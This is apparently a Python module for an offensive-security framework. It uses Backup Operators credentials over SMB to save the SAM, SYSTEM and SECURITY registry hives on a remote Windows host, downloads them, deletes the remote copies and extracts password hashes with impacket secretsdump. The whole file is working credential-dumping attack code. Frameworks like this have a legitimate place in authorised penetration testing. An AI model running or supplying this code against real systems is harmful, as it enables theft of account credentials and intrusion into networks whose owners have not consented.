#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Backup Operators → registry hive dump via SMB (NetExec: -M backup_operator inspired)."""

from __future__ import annotations

import os
import time
from pathlib import Path

from kittysploit import *
from lib.protocols.smb.smb_session_mixin import SMBSessionMixin


class Module(Post, SMBSessionMixin):
    __info__ = {
        "name": "SMB Backup Operator Hive Dump",
        "description": (
            "Uses Backup Operators-capable credentials to save SAM/SYSTEM/SECURITY hives "
            "via reg save over SMB exec, then downloads them (NetExec backup_operator "
            "inspired). Optional secretsdump if impacket is installed. Does not dump "
            "NTDS.dit online — use a shell VSS module for full NTDS."
        ),
        "author": ["KittySploit Team"],
        "session_type": SessionType.SMB,
        "tags": ["ad", "smb", "backup-operators", "sam", "ntds", "post", "netexec", "credential-access"],
        "references": [
            "https://www.netexec.wiki/",
            "https://attack.mitre.org/techniques/T1003/002/",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["credential_access", "host_modification"],
            "expected_requests": 6,
            "reversible": False,
            "approval_required": True,
            "produces": ["risk_signals", "credentials"],
        },
    }

    remote_dir = OptString(
        r"C:\Windows\Temp",
        "Remote directory for temporary hive files",
        False,
        advanced=True,
    )
    local_dir = OptString(
        "output/backup_operator",
        "Local directory to store downloaded hives",
        False,
    )
    run_secretsdump = OptBool(
        True,
        "Run impacket secretsdump on downloaded hives if available",
        False,
    )

    def run(self):
        info = self.get_smb_connection_info()
        host = str(info.get("host") or "")
        user = str(info.get("username") or "")
        password = str(info.get("password") or "")
        domain = str(info.get("domain") or "")
        port = int(info.get("port") or 445)
        if not host or not user:
            print_error("SMB session/credentials required")
            return False

        try:
            from lib.protocols.smb.smb_exec import exec_command
        except Exception as exc:
            print_error(f"smb_exec unavailable: {exc}")
            return False

        remote_dir = str(self.remote_dir or r"C:\Windows\Temp").rstrip("\\")
        stamp = int(time.time())
        hives = {
            "SAM": rf"{remote_dir}\ks_sam_{stamp}.save",
            "SYSTEM": rf"{remote_dir}\ks_system_{stamp}.save",
            "SECURITY": rf"{remote_dir}\ks_security_{stamp}.save",
        }
        for name, path in hives.items():
            cmd = f'reg save HKLM\\{name} "{path}" /y'
            print_status(f"Saving {name} → {path}")
            try:
                code, out, err = exec_command(
                    host=host,
                    username=user,
                    password=password,
                    command=cmd,
                    domain=domain,
                    port=port,
                )
                if out:
                    print_info(out.strip()[:200])
                if code not in (0, None) and err:
                    print_warning(err.strip()[:200])
            except ImportError:
                print_error("impacket is required (pip install impacket)")
                return False
            except Exception as exc:
                print_error(f"reg save {name} failed: {exc}")
                return False

        # Download via ADMIN$ mapping of C:\Windows\Temp
        client = self.open_smb()
        local_root = Path(str(self.local_dir or "output/backup_operator"))
        local_root.mkdir(parents=True, exist_ok=True)
        downloaded = {}
        for name, remote_path in hives.items():
            # Convert C:\Windows\Temp\file → share ADMIN$ path Windows\Temp\file
            rel = remote_path
            if rel.lower().startswith("c:\\"):
                rel = rel[3:]
            rel = rel.replace("/", "\\")
            local_path = str(local_root / f"{name}_{stamp}.save")
            print_status(f"Downloading {name} → {local_path}")
            ok = False
            for share in ("ADMIN$", "C$"):
                try:
                    if client.get_file(share, rel, local_path):
                        ok = True
                        break
                except Exception:
                    continue
            if ok and os.path.isfile(local_path):
                downloaded[name] = local_path
                print_success(f"Saved {local_path} ({os.path.getsize(local_path)} bytes)")
            else:
                print_error(f"Failed to download {name}")

        # Cleanup remote
        for path in hives.values():
            try:
                exec_command(
                    host=host,
                    username=user,
                    password=password,
                    command=f'del /f /q "{path}"',
                    domain=domain,
                    port=port,
                )
            except Exception:
                pass

        if self.run_secretsdump and {"SAM", "SYSTEM"}.issubset(downloaded.keys()):
            try:
                from impacket.examples.secretsdump import LocalOperations, SAMHashes

                print_status("Parsing hives with secretsdump...")
                local_ops = LocalOperations(downloaded["SYSTEM"])
                boot_key = local_ops.getBootKey()
                sam = SAMHashes(downloaded["SAM"], boot_key, isRemote=False)
                sam.dump()
                sam.export(str(local_root / f"sam_{stamp}"))
                print_success(f"Hashes exported under {local_root}")
            except ImportError:
                print_info("impacket secretsdump not available — hives saved for offline parse")
            except Exception as exc:
                print_warning(f"secretsdump failed: {exc}")

        print_info(
            "For full NTDS.dit, use post/shell/windows/gather/backup_sam_system on a DC shell"
        )
        return bool(downloaded)
